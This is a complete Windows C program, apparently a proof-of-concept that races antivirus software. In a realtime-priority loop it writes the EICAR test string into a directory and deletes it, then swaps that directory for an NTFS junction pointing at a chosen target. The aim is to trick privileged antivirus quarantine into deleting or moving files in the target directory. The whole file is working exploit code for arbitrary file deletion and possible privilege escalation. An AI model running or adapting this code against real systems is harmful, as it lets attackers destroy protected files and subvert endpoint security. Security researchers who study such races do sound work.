#include "dijuno.h"


//
// ref: https://processhacker.sourceforge.io/doc/ntrtl_8h_source.html#l02967
//
typedef struct _RTLP_CURDIR_REF* PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U {
    UNICODE_STRING      RelativeName;
    HANDLE              ContainingDirectory;
    PRTLP_CURDIR_REF    CurDirRef;
} RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;

//
// ref: https://github.com/mirror/reactos/blob/master/rostests/apitests/ntdll/RtlDosPathNameToNtPathName_U.c#L77
//
typedef BOOLEAN(__stdcall* RtlDosPathNameToNtPathName_U_t)(PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U);

typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS    Status;
        PVOID       Pointer;
    };
    ULONG_PTR   Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _NtfsJunction {
    DWORD           Id;
    DWORD           LengthMin8;
    USHORT          Reserved;
    USHORT          Length;
    USHORT          MaximumLength;
    USHORT          Length2;
    WCHAR           Buffer[1];
} NTFS_JUNCTION, *PNTFS_JUNCTION;

typedef struct _RunnerArgs {
    PWSTR   JunctionPath;
    PCWSTR  SrcPath;
    PCWSTR  FilePath;
} RUNNER_ARGS, *PRUNNER_ARGS;

typedef VOID(*IO_APC_ROUTINE)(PVOID, PIO_STATUS_BLOCK, ULONG);
typedef INT(*NTFSCONTROLFILE)(
    HANDLE              FileHandle,
    HANDLE              Event,
    IO_APC_ROUTINE      ApcRoutine,
    PVOID               ApcContext,
    PIO_STATUS_BLOCK    IoStatusBlock,
    ULONG               FsControlCode,
    PVOID               InputBuffer,
    ULONG               InputBufferLength,
    PVOID               OutputBuffer,
    ULONG               OutputBufferLength);

RtlDosPathNameToNtPathName_U_t  RtlDosPathNameToNtPathName_U;
NTFSCONTROLFILE                 NtfsControlFile;

CRITICAL_SECTION    g_RunLock;
BOOL                g_Stop;

PVOID GetBuffer(SIZE_T Bytes)
{
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Bytes);
}

BOOL FreeBuffer(PWSTR Buffer)
{
    assert(Buffer != NULL);

    return HeapFree(GetProcessHeap(), 0, Buffer);
}

//
// DoubleNull - additional memory for double-null ; required for SHFileOperationW
//
PWSTR GetFullPath(PCSTR Str, BOOL DoubleNull)
{
    PWSTR   pwStr = NULL;
    PWSTR   pwFullPath = NULL;
    PWSTR   pwFilePart = NULL;
    DWORD   dwLen;
    DWORD   dwPaddLen;

    assert(Str != NULL);

    dwPaddLen = DoubleNull ? 2 : 1;

    pwStr = (PWSTR)GetBuffer(sizeof(WCHAR) * (strlen(Str) + dwPaddLen));
    if (NULL == pwStr) {
        fwprintf(stderr, L"Failed allocating buffer for conversion\n");

        return NULL;
    }
    if (MultiByteToWideChar(CP_OEMCP, MB_ERR_INVALID_CHARS, Str, (INT)strlen(Str), pwStr, (INT)strlen(Str)) == 0) {
        fwprintf(stderr, L"Conversion failed: %08X\n", GetLastError());

    clean:
        FreeBuffer(pwStr);

        return pwFullPath;
    }

    dwLen = GetFullPathName(pwStr, 0, 0, &pwFilePart);
    if (dwLen) {
        pwFullPath = (PWSTR)GetBuffer(sizeof(WCHAR) * (SIZE_T)dwLen);
        if (NULL == pwFullPath) {
            fwprintf(stderr, L"Failed allocating buffer for full path\n");

            goto clean;
        } else {
            if (!GetFullPathName(pwStr, dwLen, pwFullPath, &pwFilePart)) {
                fwprintf(stderr, L"Failed obtaining full path: %08X\n", GetLastError());

                FreeBuffer(pwFullPath);
                pwFullPath = NULL;
            }

            goto clean;
        }
    } else {
        fwprintf(stderr, L"Failed obtaining length of buffer for full path\n");

        goto clean;
    }
}

BOOL CreateJunction(PCWSTR JunctionPath, PCWSTR SrcPath)
{
    PVOID           pwBuffer = NULL;
    UNICODE_STRING  NtPathName;
    HANDLE          hFile;
    PNTFS_JUNCTION  pNtfsJunction = NULL;
    INT             NtStatus;
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    DWORD           dwLength;
    BOOL            bRetStatus = FALSE;

    //
    // as done in cmd.exe - MakeJunction function
    //
    if (CreateDirectory(JunctionPath, 0)) {
        hFile = CreateFile(JunctionPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            RtlDosPathNameToNtPathName_U(SrcPath, &NtPathName, NULL, NULL);

            dwLength = (DWORD)(NtPathName.Length + sizeof(WCHAR) * (wcslen(SrcPath) + 10));
            pwBuffer = GetBuffer(dwLength);
            if (pwBuffer != NULL) {
                pNtfsJunction = (PNTFS_JUNCTION)pwBuffer;
                pNtfsJunction->Id = 0xA0000003;
                pNtfsJunction->LengthMin8 = dwLength - 8;
                pNtfsJunction->Reserved = 0;
                pNtfsJunction->Length = NtPathName.Length;
                memcpy(pNtfsJunction->Buffer, NtPathName.Buffer, NtPathName.Length);
                pNtfsJunction->MaximumLength = pNtfsJunction->Length + sizeof(WCHAR);
                pNtfsJunction->Length2 = (USHORT)(sizeof(WCHAR) * wcslen(SrcPath));
                memcpy((PBYTE)pNtfsJunction->Buffer + pNtfsJunction->Length + sizeof(WCHAR),
                       SrcPath,
                       pNtfsJunction->Length2);
                NtStatus = NtfsControlFile(hFile,
                                           NULL,
                                           NULL,
                                           NULL,
                                           &IoStatusBlock,
                                           0x900A4,
                                           pwBuffer,
                                           dwLength,
                                           NULL,
                                           0);
                bRetStatus = NtStatus == 0;

                //fwprintf(stdout, L"Status: %08X\n", NtStatus);

                FreeBuffer(pwBuffer);
            } else {
                fwprintf(stderr, L"Failed allocating NTFS buffer\n");
            }

            CloseHandle(hFile);
        }
    } else {
        fwprintf(stderr, L"Failed creating junction directory\n");
    }

    return bRetStatus;
}

VOID Run(PVOID Args)
{
    PCSTR           szEicar = "X5O!P%@AP[4\\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    HANDLE          hFile;
    DWORD           dwNumBytes;
    PRUNNER_ARGS    pArgs = (PRUNNER_ARGS)Args;
    BOOL            bStop = FALSE;
    SHFILEOPSTRUCTW Shfo = { 0 };
    SIZE_T          i;

    pArgs->JunctionPath[wcslen(pArgs->JunctionPath) + 1] = L'\0';
    Shfo.hwnd = NULL;
    Shfo.wFunc = FO_DELETE;
    Shfo.pFrom = pArgs->JunctionPath;
    Shfo.pTo = NULL;
    Shfo.fFlags = FOF_NO_UI;
    Shfo.hNameMappings = NULL;
    Shfo.lpszProgressTitle = NULL;

loop:
    i = 0;
    while (i < 200) {
        //
        // ignore return values
        //
        SHFileOperationW(&Shfo);
        CreateDirectory(pArgs->JunctionPath, 0);
        hFile = CreateFile(pArgs->FilePath,
                           GENERIC_WRITE,
                           FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL,
                           CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
        assert(hFile != INVALID_HANDLE_VALUE);
        WriteFile(hFile, szEicar, (DWORD)strlen(szEicar), &dwNumBytes, NULL);
        CloseHandle(hFile);
        SHFileOperationW(&Shfo);
        CreateJunction(pArgs->JunctionPath, pArgs->SrcPath);

        i++;
    }

    EnterCriticalSection(&g_RunLock);
    bStop = g_Stop;
    LeaveCriticalSection(&g_RunLock);

    if (bStop) {
        fwprintf(stdout, L"Thread stopping.\n");
    } else {
        goto loop;
    }
}

BOOL Init(VOID)
{
    InitializeCriticalSection(&g_RunLock);

    RtlDosPathNameToNtPathName_U = (RtlDosPathNameToNtPathName_U_t)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlDosPathNameToNtPathName_U");
    NtfsControlFile = (NTFSCONTROLFILE)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtFsControlFile");
    if (RtlDosPathNameToNtPathName_U && NtfsControlFile) {
        return TRUE;
    } else {
        return FALSE;
    }
}

int main(int argc, char** argv)
{
    PWSTR       pwJunctionPath = NULL;
    PWSTR       pwSrcPath = NULL;
    PWSTR       pwFileName = NULL;
    PWSTR       pwFilePath = NULL;
    SIZE_T      dwLen;
    HANDLE      hRunner;
    DWORD       dwThreadId;
    RUNNER_ARGS Args = { 0 };

    if (argc < 4) {
        fwprintf(stderr, L"USAGE: %S <junction_path> <source_dir_path> <file_name>\n", argv[0]);

        return EXIT_FAILURE;
    }
    if (!Init()) {
        fwprintf(stderr, L"Init failed\n");

        return EXIT_FAILURE;
    }

    pwJunctionPath = GetFullPath(argv[1], TRUE);
    if (NULL == pwJunctionPath) {
        return EXIT_FAILURE;
    }
    pwSrcPath = GetFullPath(argv[2], FALSE);
    if (NULL == pwSrcPath) {
        FreeBuffer(pwJunctionPath);

        return EXIT_FAILURE;
    }
    pwFileName = (PWSTR)GetBuffer(sizeof(WCHAR) * (strlen(argv[3]) + 1));
    if (NULL == pwFileName) {
        fwprintf(stderr, L"Failed allocating buffer for file name conversion\n");

        FreeBuffer(pwJunctionPath);

        return EXIT_FAILURE;
    }
    if (MultiByteToWideChar(CP_OEMCP, MB_ERR_INVALID_CHARS, argv[3], (INT)strlen(argv[3]), pwFileName, (INT)strlen(argv[3])) == 0) {
        fwprintf(stderr, L"File name conversion failed: %08X\n", GetLastError());

        FreeBuffer(pwJunctionPath);
        FreeBuffer(pwFileName);

        return EXIT_FAILURE;
    }
    dwLen = sizeof(WCHAR) * (wcslen(pwJunctionPath) + 1 + wcslen(pwFileName));
    pwFilePath = (PWSTR)GetBuffer(dwLen + sizeof(WCHAR));
    if (NULL == pwFilePath) {
        fwprintf(stderr, L"Failed allocating buffer for file path concatenation\n");

        FreeBuffer(pwJunctionPath);
        FreeBuffer(pwFileName);

        return EXIT_FAILURE;
    }
    //
    // ignore return values
    //
    wmemcpy(pwFilePath, pwJunctionPath, wcslen(pwJunctionPath));
    wcsncat_s(pwFilePath, dwLen, L"\\", 1);
    wcsncat_s(pwFilePath, dwLen, pwFileName, wcslen(pwFileName));

    fwprintf(stdout, L"Junction path: %ls\n", pwJunctionPath);
    fwprintf(stdout, L"Source directory path: %ls\n", pwSrcPath);
    fwprintf(stdout, L"File name path: %ls\n\n", pwFilePath);

    Args.JunctionPath = pwJunctionPath;
    Args.SrcPath = pwSrcPath;
    Args.FilePath = pwFilePath;
    hRunner = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Run, (PVOID)&Args, 0, &dwThreadId);
    if (SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS)) {
        if (SetThreadPriority(hRunner, THREAD_PRIORITY_TIME_CRITICAL)) {
            fwprintf(stdout, L"Thread priority was successfully updated to THREAD_PRIORITY_TIME_CRITICAL\n");
        }
    }

    fwprintf(stdout, L"Thread %lu is running. Press Enter to stop...\n", dwThreadId);
    getchar();
    fwprintf(stdout, L"Waiting for worker thread to exit.\n");

    EnterCriticalSection(&g_RunLock);
    g_Stop = TRUE;
    LeaveCriticalSection(&g_RunLock);

    WaitForSingleObject(hRunner, INFINITE);

    fwprintf(stdout, L"Done!\n");

    FreeBuffer(pwJunctionPath);
    FreeBuffer(pwSrcPath);
    FreeBuffer(pwFileName);
    FreeBuffer(pwFilePath);

    return EXIT_SUCCESS;
}
